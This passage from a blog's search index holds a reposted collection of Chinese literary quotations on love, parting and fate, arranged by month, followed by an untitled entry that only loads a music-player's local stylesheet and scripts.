</p></li><li><p>有时候我也会思考，到底是因为我从没遇到过坏人，才能一直维持对善良的信任，还是因为内心一直保有孩童   的纯真，才能一直享受这种让人羡慕的好运？<br>到底哪个是因，哪个是果？  </p></li><li><p>神会安排好一切，你要等。</p></li></ul><h2 id="五月-我们对面坐着，犹如梦中"><a href="#五月-我们对面坐着，犹如梦中" class="headerlink" title="五月 我们对面坐着，犹如梦中"></a>五月 我们对面坐着，犹如梦中</h2><ul><li><p>人世冷暖，如同盲人摸象，永远无法得知其全貌，我只能用所有的真诚和勇气来探究它的虚实。</p></li><li><p>烟色发来短信问我：“舟，像我们这种心口插着一把刀子的人，出去旅行有用吗？”<br>我回答她说：“没用，真的。”<br>在你心里捅下这把刀的人，早已经云淡风轻的扬长而去，但你走得再远，心还是疼。</p></li><li><p>这世间没有任何一样东西能够令我狂热地想要得到，没有任何一个人能够令我想要以爱地名义，夺取他的自由。</p></li><li><p>从宏观上看，每个人眼里的世界观都是相似的，但正因为细小物件的存在，才构成了人生的千差万别。</p></li></ul><h2 id="六月-青草盛开，处处芬芳"><a href="#六月-青草盛开，处处芬芳" class="headerlink" title="六月 青草盛开，处处芬芳"></a>六月 青草盛开，处处芬芳</h2><ul><li><p>我不知道还可以拿出什么来让你留下，我这残破的余生，像是早已荒芜的花园，长不出一株明艳的植物。</p></li><li><p>我们对人和事物的态度，其实就是某个时间段，自己内心的折射。审美其实是善变的，只是我们当初都不明白。</p></li><li><p>有些人，身无长物，却可以心拥天下。</p></li><li><p>愿赤裸相对时，能够不伤你。</p></li><li><p>你就回到你原本的生活轨道之中去吧，我有我无可消抵的孤寂和沉默。</p></li></ul><h2 id="七月-麦浪翻滚连同草地，直到天涯"><a href="#七月-麦浪翻滚连同草地，直到天涯" class="headerlink" title="七月 麦浪翻滚连同草地，直到天涯"></a>七月 麦浪翻滚连同草地，直到天涯</h2><ul><li><p>后来才知道，一个人能对你造成的最大伤害，并不是他不爱你，而是摧毁你的自信。从前你只知道自己不够好，但经过他之后你才知道原来自己这么差。</p></li><li><p>人间别久不成悲。</p></li></ul><h2 id="八月-就是八月，我守口如瓶"><a href="#八月-就是八月，我守口如瓶" class="headerlink" title="八月 就是八月，我守口如瓶"></a>八月 就是八月，我守口如瓶</h2><ul><li><p>我们不能只看到这座城市的疮痍</p></li><li><p>我们都生活在下水道里，但依然有人夜夜仰望星空。</p></li><li><p>你曾给我的星空，后来我也在别处看到。<br>但愿你曾少我的，将来我也能在别处得到。</p></li><li><p>只爱一个人是最幸福的，虽然大多数人都做不到，但我仍愿意这样相信。</p></li><li><p>这是我第二次在喜马拉雅附近看日出，上一次，我在它的另一边。<br>我用了多长的时间，终于将它的南北两面都与我的人生相连。</p></li></ul><h2 id="九月和十月，是两只眼睛，装满了大海。你在海上，我在海下"><a href="#九月和十月，是两只眼睛，装满了大海。你在海上，我在海下" class="headerlink" title="九月和十月，是两只眼睛，装满了大海。你在海上，我在海下"></a>九月和十月，是两只眼睛，装满了大海。你在海上，我在海下</h2><ul><li><p>爱情是奢侈品，有最好，没有也能活。</p></li><li><p>令我痛苦的，并不是我必须离别某个人。<br>真正令我绝望的，是离别本身。<br>那个夜里，我忽然明白，原来生命是不断地与心爱的人和事物隔绝的过程。</p></li><li><p>成年人有一个很坏的毛病，就是对别人的痛苦从来没有怜悯，所以他们自己的世界也长年累月地弥漫着痛苦和压抑。</p></li><li><p>有些感情，是一场天花，得过之后，终身免疫。</p></li><li><p>谁也不能拯救谁，我们各自有着各自的苦难，这就是我们的命运。</p></li></ul><h2 id="十一月尚未到来，透过它的窗口，我望见了十二月"><a href="#十一月尚未到来，透过它的窗口，我望见了十二月" class="headerlink" title="十一月尚未到来，透过它的窗口，我望见了十二月"></a>十一月尚未到来，透过它的窗口，我望见了十二月</h2><ul><li><p>世间有关情感的允诺，大多是只是为了应景，若真正追究起来，首先上当的便是自己。</p></li><li><p>千变万化的是人心，纹丝不动的是命运。</p></li><li><p>顷刻生，须臾死，流逝的不是青春，是我们自己。</p></li><li><p>每个人展示给世界的都只是某一个角度的侧面。</p></li></ul><h2 id="十二月-归途"><a href="#十二月-归途" class="headerlink" title="十二月 归途"></a>十二月 归途</h2><ul><li>我亦飘零久，十年来，深恩负尽，死生师友。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摘记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无题</title>
      <link href="/2002/01/13/index/"/>
      <url>/2002/01/13/index/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
